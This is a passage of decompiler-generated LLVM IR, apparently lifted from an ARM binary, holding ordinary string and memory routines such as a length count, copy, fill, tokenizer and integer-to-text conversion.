  uselistorder i32 (i32, i32, i32, i32, i32)* @function_ba74, { 2, 4, 3, 1, 0 }
  uselistorder i32 ()* @function_9444, { 2, 1, 0 }
  uselistorder i32* @global_var_1744c.201, { 0, 2, 1 }
  uselistorder i32 ()* @function_b8ac, { 2, 1, 0 }
  uselistorder label %dec_label_pc_ab00, { 1, 0 }
  uselistorder label %dec_label_pc_aaf8, { 1, 0 }
  uselistorder label %dec_label_pc_aa1c, { 0, 2, 1, 3 }
  uselistorder label %thread-pre-split, { 1, 0 }
}

define i32 @function_ab0c() local_unnamed_addr {
dec_label_pc_ab0c:
  %v0_ab0c = load i32, i32* @r0, align 4
  store i32 %v0_ab0c, i32* @r2, align 4
  br label %dec_label_pc_ab1c

dec_label_pc_ab1c:                                ; preds = %dec_label_pc_ab1c, %dec_label_pc_ab0c
  %storemerge = phi i32 [ 0, %dec_label_pc_ab0c ], [ %v1_ab18, %dec_label_pc_ab1c ]
  %v2_ab1c = add i32 %storemerge, %v0_ab0c
  %v3_ab1c = inttoptr i32 %v2_ab1c to i8*
  %v4_ab1c = load i8, i8* %v3_ab1c, align 1
  %v2_ab20 = icmp eq i8 %v4_ab1c, 0
  %v1_ab18 = add i32 %storemerge, 1
  br i1 %v2_ab20, label %dec_label_pc_ab28, label %dec_label_pc_ab1c

dec_label_pc_ab28:                                ; preds = %dec_label_pc_ab1c
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %storemerge, { 0, 2, 1 }
}

define i32 @function_ab2c(i8* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_ab2c:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r2.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r2.global-to-local, align 4
  %v2_ab382 = load i8, i8* %arg1, align 1
  %v2_ab3c4 = icmp eq i8 %v2_ab382, 0
  store i1 %v2_ab3c4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_ab3c4, label %dec_label_pc_ab44, label %dec_label_pc_ab34

dec_label_pc_ab34:                                ; preds = %dec_label_pc_ab2c, %dec_label_pc_ab34
  %v0_ab34 = phi i32 [ %v1_ab34, %dec_label_pc_ab34 ], [ %tmp, %dec_label_pc_ab2c ]
  %v1_ab34 = add i32 %v0_ab34, 1
  store i32 %v1_ab34, i32* %r2.global-to-local, align 4
  %v1_ab38 = inttoptr i32 %v1_ab34 to i8*
  %v2_ab38 = load i8, i8* %v1_ab38, align 1
  %v2_ab3c = icmp eq i8 %v2_ab38, 0
  store i1 %v2_ab3c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_ab3c, label %dec_label_pc_ab44, label %dec_label_pc_ab34

dec_label_pc_ab44:                                ; preds = %dec_label_pc_ab2c, %dec_label_pc_ab34, %dec_label_pc_ab44
  %v2_ab4c = phi i32 [ %v5_ab4c, %dec_label_pc_ab44 ], [ %tmp, %dec_label_pc_ab2c ], [ %v1_ab34, %dec_label_pc_ab34 ]
  %v0_ab44 = load i32, i32* @r1, align 4
  %v1_ab44 = inttoptr i32 %v0_ab44 to i8*
  %v2_ab44 = load i8, i8* %v1_ab44, align 1
  %v5_ab44 = add i32 %v0_ab44, 1
  store i32 %v5_ab44, i32* @r1, align 4
  %v2_ab48 = icmp eq i8 %v2_ab44, 0
  store i1 %v2_ab48, i1* %cpsr_z.global-to-local, align 1
  %v3_ab4c = inttoptr i32 %v2_ab4c to i8*
  store i8 %v2_ab44, i8* %v3_ab4c, align 1
  %v4_ab4c = load i32, i32* %r2.global-to-local, align 4
  %v5_ab4c = add i32 %v4_ab4c, 1
  store i32 %v5_ab4c, i32* %r2.global-to-local, align 4
  %v0_ab50 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_ab50, label %dec_label_pc_ab54, label %dec_label_pc_ab44

dec_label_pc_ab54:                                ; preds = %dec_label_pc_ab44
  ret i32 %tmp

; uselistorder directives
  uselistorder i32 %v5_ab4c, { 1, 0 }
  uselistorder i32 %v1_ab34, { 0, 3, 2, 1 }
  uselistorder i32 %tmp, { 3, 0, 1, 2 }
  uselistorder i32* %r2.global-to-local, { 3, 2, 0, 1 }
  uselistorder i1* %cpsr_z.global-to-local, { 1, 2, 3, 0 }
  uselistorder label %dec_label_pc_ab44, { 2, 1, 0 }
  uselistorder label %dec_label_pc_ab34, { 1, 0 }
}

define i32 @function_ab58(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_ab58:
  %ip.global-to-local = alloca i32, align 4
  store i32 0, i32* %ip.global-to-local, align 4
  %v0_ab6c1 = load i32, i32* @r2, align 4
  %v1_ab6c2 = add i32 %v0_ab6c1, -1
  store i32 %v1_ab6c2, i32* @r2, align 4
  %v2_ab6c3 = icmp eq i32 %v0_ab6c1, 0
  br i1 %v2_ab6c3, label %dec_label_pc_ab74, label %dec_label_pc_ab60

dec_label_pc_ab60:                                ; preds = %dec_label_pc_ab60, %dec_label_pc_ab58
  %v0_ab60 = phi i32 [ %v1_ab68, %dec_label_pc_ab60 ], [ 0, %dec_label_pc_ab58 ]
  %v2_ab60 = add i32 %v0_ab60, %arg2
  %v3_ab60 = inttoptr i32 %v2_ab60 to i8*
  %v4_ab60 = load i8, i8* %v3_ab60, align 1
  %v4_ab64 = add i32 %v0_ab60, %arg1
  %v5_ab64 = inttoptr i32 %v4_ab64 to i8*
  store i8 %v4_ab60, i8* %v5_ab64, align 1
  %v0_ab68 = load i32, i32* %ip.global-to-local, align 4
  %v1_ab68 = add i32 %v0_ab68, 1
  store i32 %v1_ab68, i32* %ip.global-to-local, align 4
  %v0_ab6c = load i32, i32* @r2, align 4
  %v1_ab6c = add i32 %v0_ab6c, -1
  store i32 %v1_ab6c, i32* @r2, align 4
  %v2_ab6c = icmp eq i32 %v0_ab6c, 0
  br i1 %v2_ab6c, label %dec_label_pc_ab74, label %dec_label_pc_ab60

dec_label_pc_ab74:                                ; preds = %dec_label_pc_ab60, %dec_label_pc_ab58
  ret i32 %arg1

; uselistorder directives
  uselistorder i32 %v1_ab68, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @function_ab78(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_ab78:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_ab78 = load i32, i32* @r4, align 4
  store i32 %v3_ab78, i32* %stack_var_-8, align 4
  br label %dec_label_pc_ab88

dec_label_pc_ab88:                                ; preds = %dec_label_pc_ab88, %dec_label_pc_ab78
  %storemerge = phi i32 [ 0, %dec_label_pc_ab78 ], [ %v1_ab90, %dec_label_pc_ab88 ]
  store i32 %storemerge, i32* %r4.global-to-local, align 4
  %v2_ab88 = add i32 %storemerge, %arg1
  %v3_ab88 = inttoptr i32 %v2_ab88 to i8*
  %v4_ab88 = load i8, i8* %v3_ab88, align 1
  %v2_ab8c = icmp eq i8 %v4_ab88, 0
  %v1_ab90 = add i32 %storemerge, 1
  store i32 %v1_ab90, i32* @r2, align 4
  br i1 %v2_ab8c, label %dec_label_pc_ab98, label %dec_label_pc_ab88

dec_label_pc_ab98:                                ; preds = %dec_label_pc_ab88
  %v0_ab98 = load i32, i32* @r0, align 4
  %v3_ab98 = call i32 @function_ab58(i32 %v0_ab98, i32 %arg1, i32 %v1_ab90)
  %v0_ab9c = load i32, i32* %r4.global-to-local, align 4
  %v2_aba0 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_aba0, i32* @r4, align 4
  ret i32 %v0_ab9c

; uselistorder directives
  uselistorder i32 %v1_ab90, { 0, 2, 1 }
  uselistorder i32 %storemerge, { 1, 0, 2 }
  uselistorder i32 (i32, i32, i32)* @function_ab58, { 1, 4, 3, 0, 2 }
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @function_aba4(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_aba4:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %v1_aba4 = urem i32 %arg2, 256
  store i32 %v1_aba4, i32* %r1.global-to-local, align 4
  store i32 0, i32* @r3, align 4
  %v0_abb81 = load i32, i32* @r2, align 4
  %v1_abb82 = add i32 %v0_abb81, -1
  store i32 %v1_abb82, i32* %r2.global-to-local, align 4
  %v2_abb83 = icmp eq i32 %v0_abb81, 0
  %extract.t14 = trunc i32 %arg2 to i8
  br i1 %v2_abb83, label %dec_label_pc_abc0, label %dec_label_pc_abb0

dec_label_pc_abb0:                                ; preds = %dec_label_pc_aba4, %dec_label_pc_abb0.dec_label_pc_abb0_crit_edge
  %arg2.sink.off0 = phi i8 [ %extract.t, %dec_label_pc_abb0.dec_label_pc_abb0_crit_edge ], [ %extract.t14, %dec_label_pc_aba4 ]
  %v2_abb0 = phi i32 [ %v1_abb4, %dec_label_pc_abb0.dec_label_pc_abb0_crit_edge ], [ 0, %dec_label_pc_aba4 ]
  %v4_abb0 = add i32 %v2_abb0, %arg1
  %v5_abb0 = inttoptr i32 %v4_abb0 to i8*
  store i8 %arg2.sink.off0, i8* %v5_abb0, align 1
  %v0_abb4 = load i32, i32* @r3, align 4
  %v1_abb4 = add i32 %v0_abb4, 1
  store i32 %v1_abb4, i32* @r3, align 4
  %v0_abb8 = load i32, i32* %r2.global-to-local, align 4
  %v1_abb8 = add i32 %v0_abb8, -1
  store i32 %v1_abb8, i32* %r2.global-to-local, align 4
  %v2_abb8 = icmp eq i32 %v0_abb8, 0
  br i1 %v2_abb8, label %dec_label_pc_abc0, label %dec_label_pc_abb0.dec_label_pc_abb0_crit_edge

dec_label_pc_abb0.dec_label_pc_abb0_crit_edge:    ; preds = %dec_label_pc_abb0
  %v0_abb0.pre = load i32, i32* %r1.global-to-local, align 4
  %extract.t = trunc i32 %v0_abb0.pre to i8
  br label %dec_label_pc_abb0

dec_label_pc_abc0:                                ; preds = %dec_label_pc_abb0, %dec_label_pc_aba4
  ret i32 %arg1

; uselistorder directives
  uselistorder i32 %v1_abb4, { 1, 0 }
  uselistorder i32* %r2.global-to-local, { 2, 1, 0 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_abb0, { 1, 0 }
}

define i32 @function_abc4(i32 %arg1, i8* %arg2) local_unnamed_addr {
dec_label_pc_abc4:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg2 to i32
  store i32 %tmp, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %v3_abc4 = icmp eq i8* %arg2, null
  store i1 %v3_abc4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_abc4, label %bb, label %bb29

bb:                                               ; preds = %dec_label_pc_abc4
  store i32 %tmp, i32* %r0.global-to-local, align 4
  ret i32 %tmp

bb29:                                             ; preds = %dec_label_pc_abc4
  %v0_abd4.pr = load i32, i32* %r0.global-to-local, align 4
  %v2_abd4 = icmp eq i32 %v0_abd4.pr, 0
  store i1 %v2_abd4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_abd4, label %dec_label_pc_abdc, label %dec_label_pc_abf8.preheader

dec_label_pc_abdc:                                ; preds = %bb29
  store i32 ptrtoint (i8** @global_var_17450.204 to i32), i32* %r3.global-to-local, align 4
  %v2_abe0 = load i8*, i8** @global_var_17450.204, align 4
  %v3_abe0 = ptrtoint i8* %v2_abe0 to i32
  store i32 %v3_abe0, i32* %r0.global-to-local, align 4
  %v2_abe4 = icmp eq i8* %v2_abe0, null
  store i1 %v2_abe4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_abe4, label %bb30, label %dec_label_pc_abf8.preheader

dec_label_pc_abf8.preheader:                      ; preds = %bb29, %dec_label_pc_abdc
  %v0_ac3c = phi i32 [ %v0_abd4.pr, %bb29 ], [ %v3_abe0, %dec_label_pc_abdc ]
  store i32 0, i32* @lr, align 4
  %v3_abf815 = inttoptr i32 %v0_ac3c to i8*
  %v4_abf816 = load i8, i8* %v3_abf815, align 1
  %v6_abf817 = zext i8 %v4_abf816 to i32
  store i32 %v6_abf817, i32* %r3.global-to-local, align 4
  %v2_abfc18 = icmp eq i8 %v4_abf816, 0
  store i1 %v2_abfc18, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_abfc18, label %dec_label_pc_ac04, label %dec_label_pc_abf4

bb30:                                             ; preds = %dec_label_pc_abdc
  ret i32 %v3_abe0

dec_label_pc_abf4:                                ; preds = %dec_label_pc_abf8.preheader, %dec_label_pc_abf4
  %v0_abf4 = phi i32 [ %v1_abf4, %dec_label_pc_abf4 ], [ 0, %dec_label_pc_abf8.preheader ]
  %v1_abf4 = add i32 %v0_abf4, 1
  store i32 %v1_abf4, i32* @lr, align 4
  %v2_abf8 = add i32 %v1_abf4, %v0_ac3c
  %v3_abf8 = inttoptr i32 %v2_abf8 to i8*
  %v4_abf8 = load i8, i8* %v3_abf8, align 1
  %v6_abf8 = zext i8 %v4_abf8 to i32
  store i32 %v6_abf8, i32* %r3.global-to-local, align 4
  %v2_abfc = icmp eq i8 %v4_abf8, 0
  store i1 %v2_abfc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_abfc, label %dec_label_pc_ac04, label %dec_label_pc_abf4

dec_label_pc_ac04:                                ; preds = %dec_label_pc_abf4, %dec_label_pc_abf8.preheader
  %v1_ac204 = phi i32 [ 0, %dec_label_pc_abf8.preheader ], [ %v1_abf4, %dec_label_pc_abf4 ]
  %v0_ac04 = phi i32 [ %v6_abf817, %dec_label_pc_abf8.preheader ], [ %v6_abf8, %dec_label_pc_abf4 ]
  %v9_ac2012 = icmp eq i32 %v0_ac04, %v1_ac204
  store i1 %v9_ac2012, i1* %cpsr_z.global-to-local, align 1
  %v5_ac2413 = icmp slt i32 %v0_ac04, %v1_ac204
  br i1 %v5_ac2413, label %dec_label_pc_ac0c, label %dec_label_pc_ac70

dec_label_pc_ac0c:                                ; preds = %dec_label_pc_ac04, %dec_label_pc_ac1c
  %v3_ac60 = phi i32 [ %v1_ac1c, %dec_label_pc_ac1c ], [ %v0_ac04, %dec_label_pc_ac04 ]
  %v2_ac0c = add i32 %v3_ac60, %v0_ac3c
  %v3_ac0c = inttoptr i32 %v2_ac0c to i8*
  %v4_ac0c = load i8, i8* %v3_ac0c, align 1
  %v6_ac0c = zext i8 %v4_ac0c to i32
  store i32 %v6_ac0c, i32* %r3.global-to-local, align 4
  %v3_ac10 = load i8, i8* %arg2, align 1
  %v4_ac10 = zext i8 %v3_ac10 to i32
  store i32 %v4_ac10, i32* %r2.global-to-local, align 4
  %v9_ac14 = icmp eq i8 %v3_ac10, %v4_ac0c
  store i1 %v9_ac14, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_ac14, label %dec_label_pc_ac2c, label %dec_label_pc_ac1c

dec_label_pc_ac1c:                                ; preds = %dec_label_pc_ac0c
  %v1_ac1c = add nsw i32 %v3_ac60, 1
  %v9_ac20 = icmp eq i32 %v1_ac1c, %v1_ac204
  store i1 %v9_ac20, i1* %cpsr_z.global-to-local, align 1
  %v5_ac24 = icmp slt i32 %v1_ac1c, %v1_ac204
  br i1 %v5_ac24, label %dec_label_pc_ac0c, label %dec_label_pc_ac70

dec_label_pc_ac2c:                                ; preds = %dec_label_pc_ac0c
  %v2_ac2c = load i8, i8* %v3_abf815, align 1
  %v3_ac2c = zext i8 %v2_ac2c to i32
  store i32 %v3_ac2c, i32* %r3.global-to-local, align 4
  %v9_ac30 = icmp eq i8 %v2_ac2c, %v4_ac0c
  store i1 %v9_ac30, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_ac30, label %dec_label_pc_ac38, label %dec_label_pc_ac4c

dec_label_pc_ac38:                                ; preds = %dec_label_pc_ac2c
  store i32 ptrtoint (i8** @global_var_17450.204 to i32), i32* %r3.global-to-local, align 4
  %v1_ac3c = add i32 %v0_ac3c, 1
  store i32 %v1_ac3c, i32* %r2.global-to-local, align 4
  store i32 %tmp, i32* %r0.global-to-local, align 4
  store i32 %v1_ac3c, i32* bitcast (i8** @global_var_17450.204 to i32*), align 4
  ret i32 %tmp

dec_label_pc_ac4c:                                ; preds = %dec_label_pc_ac2c
  store i32 %v2_ac0c, i32* %r3.global-to-local, align 4
  %v1_ac50 = add i32 %v2_ac0c, 1
  %v7_ac50 = icmp eq i32 %v1_ac50, 0
  store i1 %v7_ac50, i1* %cpsr_z.global-to-local, align 1
  store i32 ptrtoint (i8** @global_var_17450.204 to i32), i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  br i1 %v7_ac50, label %bb32, label %bb31

bb31:                                             ; preds = %dec_label_pc_ac4c
  store i32 %v1_ac50, i32* %r3.global-to-local, align 4
  br label %bb32

bb32:                                             ; preds = %dec_label_pc_ac4c, %bb31
  store i8 0, i8* %v3_ac0c, align 1
  %v0_ac64 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_ac64, label %.thread3, label %bb33

bb33:                                             ; preds = %bb32
  %v1_ac64 = load i32, i32* %r3.global-to-local, align 4
  %v2_ac64 = load i32, i32* %r1.global-to-local, align 4
  %v3_ac64 = inttoptr i32 %v2_ac64 to i32*
  store i32 %v1_ac64, i32* %v3_ac64, align 4
  br label %bb34

.thread3:                                         ; preds = %bb32
  %v1_ac68 = load i32, i32* %r2.global-to-local, align 4
  %v2_ac68 = load i32, i32* %r1.global-to-local, align 4
  %v3_ac68 = inttoptr i32 %v2_ac68 to i32*
  store i32 %v1_ac68, i32* %v3_ac68, align 4
  br label %bb34

bb34:                                             ; preds = %bb33, %.thread3
  %v5_ac6c = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v5_ac6c

dec_label_pc_ac70:                                ; preds = %dec_label_pc_ac1c, %dec_label_pc_ac04
  store i32 ptrtoint (i8** @global_var_17450.204 to i32), i32* %r3.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 0, i32* bitcast (i8** @global_var_17450.204 to i32*), align 4
  ret i32 %v0_ac3c

; uselistorder directives
  uselistorder i1 %v9_ac30, { 1, 0 }
  uselistorder i32 %v1_ac1c, { 2, 1, 0 }
  uselistorder i32 %v2_ac0c, { 1, 0, 2 }
  uselistorder i32 %v3_ac60, { 1, 0 }
  uselistorder i32 %v0_ac04, { 0, 2, 1 }
  uselistorder i32 %v1_ac204, { 0, 1, 3, 2 }
  uselistorder i32 %v1_abf4, { 0, 1, 3, 2 }
  uselistorder i32 %v0_ac3c, { 3, 2, 0, 1, 4 }
  uselistorder i32 %v0_abd4.pr, { 1, 0 }
  uselistorder i32 %tmp, { 1, 2, 0, 3, 4 }
  uselistorder i32* %r3.global-to-local, { 0, 2, 1, 3, 4, 5, 6, 7, 9, 8 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 0 }
  uselistorder i32* %r0.global-to-local, { 3, 2, 4, 0, 5, 1 }
  uselistorder i1* %cpsr_z.global-to-local, { 0, 1, 2, 4, 3, 9, 5, 10, 6, 7, 8 }
  uselistorder i32* bitcast (i8** @global_var_17450.204 to i32*), { 1, 0 }
  uselistorder i8** @global_var_17450.204, { 0, 2, 1 }
  uselistorder i32 ptrtoint (i8** @global_var_17450.204 to i32), { 3, 2, 1, 0 }
  uselistorder i8* %arg2, { 1, 0, 2 }
  uselistorder label %bb34, { 1, 0 }
  uselistorder label %bb32, { 1, 0 }
  uselistorder label %dec_label_pc_ac0c, { 1, 0 }
  uselistorder label %dec_label_pc_abf4, { 1, 0 }
  uselistorder label %dec_label_pc_abf8.preheader, { 1, 0 }
}

define i32 @function_ac84(i8 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_ac84:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = sext i8 %arg1 to i32
  %stack_var_-58 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_ac84 = load i32, i32* @r4, align 4
  store i32 %v3_ac84, i32* %stack_var_-24, align 4
  %v19_ac84 = ptrtoint i32* %stack_var_-24 to i32
  %v0_ac88 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v0_ac88, i32* %r7.global-to-local, align 4
  %v2_ac88 = icmp eq i32 %v0_ac88, 0
  store i1 %v2_ac88, i1* %cpsr_z.global-to-local, align 1
  store i32 %arg2, i32* %r6.global-to-local, align 4
  br i1 %v2_ac88, label %dec_label_pc_ad48, label %dec_label_pc_ac98

dec_label_pc_ac98:                                ; preds = %dec_label_pc_ac84
  %v3_ac98 = icmp eq i8 %arg1, 0
  store i1 %v3_ac98, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_ac98, label %.thread, label %dec_label_pc_acac

.thread:                                          ; preds = %dec_label_pc_ac98
  %v4_aca0 = inttoptr i32 %v0_ac88 to i8*
  store i8 48, i8* %v4_aca0, align 1
  %v0_aca4.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_aca4.pr.pr, label %.thread1, label %dec_label_pc_acac

.thread1:                                         ; preds = %.thread
  %v4_aca4 = load i32, i32* %r7.global-to-local, align 4
  %v5_aca4 = add i32 %v4_aca4, 1
  %v6_aca4 = inttoptr i32 %v5_aca4 to i8*
  store i8 0, i8* %v6_aca4, align 1
  %v0_aca8.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_aca8.pr.pr, label %dec_label_pc_ad48, label %dec_label_pc_acac

dec_label_pc_acac:                                ; preds = %dec_label_pc_ac98, %.thread, %.thread1
  %v7_acb0 = icmp eq i32 %arg2, 10
  store i1 %v7_acb0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_acb0, label %.thread3, label %.thread4

.thread4:                                         ; preds = %dec_label_pc_acac
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %.thread10

.thread3:                                         ; preds = %dec_label_pc_acac
  %tmp55 = icmp slt i8 %arg1, 0
  %v2_acbc = icmp eq i1 %tmp55, false
  store i1 %v2_acbc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_acbc, label %.thread10, label %bb

.thread10:                                        ; preds = %.thread4, %.thread3
  store i32 0, i32* %r8.global-to-local, align 4
  store i32 %tmp, i32* @r4, align 4
  br label %bb49

bb:                                               ; preds = %.thread3
  %v3_accc = sub nsw i32 0, %tmp
  store i32 %v3_accc, i32* @r4, align 4
  store i32 1, i32* %r8.global-to-local, align 4
  br label %bb49

bb49:                                             ; preds = %.thread10, %bb
  %v0_ad1423 = phi i32 [ %tmp, %.thread10 ], [ %v3_accc, %bb ]
  %v0_ad2054 = phi i32 [ 0, %.thread10 ], [ 1, %bb ]
  store i32 32, i32* %r5.global-to-local, align 4
  %v2_ad1022 = icmp eq i32 %v0_ad1423, 0
  store i1 %v2_ad1022, i1* %cpsr_z.global-to-local, align 1
  %v0_ad1824 = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_ad1824, i32* %r1.global-to-local, align 4
  br i1 %v2_ad1022, label %dec_label_pc_ad20, label %dec_label_pc_ace0

dec_label_pc_ace0:                                ; preds = %bb49, %dec_label_pc_ad10
  %v0_ad1826 = phi i32 [ %v0_ad18, %dec_label_pc_ad10 ], [ %v0_ad1824, %bb49 ]
  %v0_ad1425 = phi i32 [ %v0_ad04, %dec_label_pc_ad10 ], [ %v0_ad1423, %bb49 ]
  %sext = mul i32 %v0_ad1425, 16777216
  %v1_ace0 = sdiv i32 %sext, 16777216
  %v3_ace0 = call i32 @function_b5dc(i32 %v1_ace0, i32 %v0_ad1826)
  store i32 %v19_ac84, i32* %r1.global-to-local, align 4
  %v7_ace8 = icmp eq i32 %v3_ace0, 9
  store i1 %v7_ace8, i1* %cpsr_z.global-to-local, align 1
  %v1_acec = add i32 %v3_ace0, 48
  store i32 %v1_acec, i32* %r2.global-to-local, align 4
  %v1_acf0 = load i32, i32* %r5.global-to-local, align 4
  %v2_acf0 = add i32 %v1_acf0, %v19_ac84
  %v7_acf4 = icmp sgt i32 %v3_ace0, 9
  %extract.t = trunc i32 %v1_acec to i8
  br i1 %v7_acf4, label %bb50, label %dec_label_pc_ad10

bb50:                                             ; preds = %dec_label_pc_ace0
  %v9_acf4 = add i32 %v3_ace0, 55
  store i32 %v9_acf4, i32* %r2.global-to-local, align 4
  %extract.t36 = trunc i32 %v9_acf4 to i8
  br label %dec_label_pc_ad10

dec_label_pc_ad10:                                ; preds = %dec_label_pc_ace0, %bb50
  %v0_ad00.off0 = phi i8 [ %extract.t, %dec_label_pc_ace0 ], [ %extract.t36, %bb50 ]
  %v0_acf8 = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_acf8, i32* @r1, align 4
  %v0_acfc = load i32, i32* @r4, align 4
  store i32 %v0_acfc, i32* @r0, align 4
  %v3_ad00 = add i32 %v2_acf0, -34
  %v4_ad00 = inttoptr i32 %v3_ad00 to i8*
  store i8 %v0_ad00.off0, i8* %v4_ad00, align 1
  %v0_ad04 = call i32 @function_b4cc()
  %v0_ad08 = load i32, i32* %r5.global-to-local, align 4
  %v1_ad08 = add i32 %v0_ad08, -1
  store i32 %v1_ad08, i32* %r5.global-to-local, align 4
  store i32 %v0_ad04, i32* @r4, align 4
  %v2_ad10 = icmp eq i32 %v0_ad04, 0
  store i1 %v2_ad10, i1* %cpsr_z.global-to-local, align 1
  %v0_ad18 = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_ad18, i32* %r1.global-to-local, align 4
  br i1 %v2_ad10, label %dec_label_pc_ad20.loopexit, label %dec_label_pc_ace0

dec_label_pc_ad20.loopexit:                       ; preds = %dec_label_pc_ad10
  %v0_ad20.pre = load i32, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_ad20

dec_label_pc_ad20:                                ; preds = %dec_label_pc_ad20.loopexit, %bb49
  %v0_ad20 = phi i32 [ %v0_ad2054, %bb49 ], [ %v0_ad20.pre, %dec_label_pc_ad20.loopexit ]
  %v1_ad2c15 = phi i32 [ 32, %bb49 ], [ %v1_ad08, %dec_label_pc_ad20.loopexit ]
  %v2_ad20 = icmp eq i32 %v0_ad20, 0
  store i1 %v2_ad20, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_ad20, label %.thread37, label %bb51

.thread37:                                        ; preds = %dec_label_pc_ad20
  %v2_ad2c16 = add i32 %v1_ad2c15, 1
  store i32 %v2_ad2c16, i32* %r5.global-to-local, align 4
  %v2_ad3438 = ptrtoint i32* %stack_var_-58 to i32
  store i32 %v2_ad3438, i32* %r1.global-to-local, align 4
  br label %bb52

bb51:                                             ; preds = %dec_label_pc_ad20
  %v3_ad28 = add i32 %v1_ad2c15, %v19_ac84
  store i32 %v3_ad28, i32* %r2.global-to-local, align 4
  %v2_ad34 = ptrtoint i32* %stack_var_-58 to i32
  store i32 %v2_ad34, i32* %r1.global-to-local, align 4
  %v4_ad38 = add i32 %v3_ad28, -34
  %v5_ad38 = inttoptr i32 %v4_ad38 to i8*
  store i8 45, i8* %v5_ad38, align 1
  %v0_ad3c.pre = load i32, i32* %r1.global-to-local, align 4
  %v1_ad3c.pre = load i32, i32* %r5.global-to-local, align 4
  br label %bb52

bb52:                                             ; preds = %.thread37, %bb51
  %v1_ad3c = phi i32 [ %v1_ad3c.pre, %bb51 ], [ %v2_ad2c16, %.thread37 ]
  %v0_ad3c = phi i32 [ %v0_ad3c.pre, %bb51 ], [ %v2_ad3438, %.thread37 ]
  %v2_ad3c = add i32 %v0_ad3c, %v1_ad3c
  store i32 %v2_ad3c, i32* %r1.global-to-local, align 4
  %v0_ad40 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_ad40, i32* @r0, align 4
  %v3_ad44 = call i32 @function_ab78(i32 %v0_ad40, i32 %v2_ad3c)
  br label %dec_label_pc_ad48

dec_label_pc_ad48:                                ; preds = %.thread1, %dec_label_pc_ac84, %bb52
  %v0_ad48 = load i32, i32* %r7.global-to-local, align 4
  %v2_ad50 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_ad50, i32* @r4, align 4
  ret i32 %v0_ad48

; uselistorder directives
  uselistorder i32 %v0_ad18, { 1, 0 }
  uselistorder i32 %v0_ad04, { 1, 2, 0 }
  uselistorder i32 %v3_ace0, { 2, 0, 1, 3 }
  uselistorder i1 %v2_acbc, { 1, 0 }
  uselistorder i32 %v0_ac88, { 0, 2, 1 }
  uselistorder i32* %stack_var_-24, { 0, 2, 1 }
  uselistorder i32* %stack_var_-58, { 1, 0 }
  uselistorder i32 %tmp, { 0, 2, 1 }
  uselistorder i32* %r8.global-to-local, { 1, 2, 0 }
  uselistorder i32* %r7.global-to-local, { 2, 0, 1, 3 }
  uselistorder i32* %r6.global-to-local, { 2, 1, 0, 3 }
  uselistorder i32* %r5.global-to-local, { 2, 0, 1, 3, 4, 5 }
  uselistorder i32* %r2.global-to-local, { 2, 3, 4, 0, 1 }
  uselistorder i32* %r1.global-to-local, { 3, 4, 5, 2, 7, 6, 1, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 2, 4, 3, 1, 5, 0, 6, 8, 7, 9, 10 }
  uselistorder i32 (i32, i32)* @function_ab78, { 13, 17, 16, 15, 0, 14, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1 }
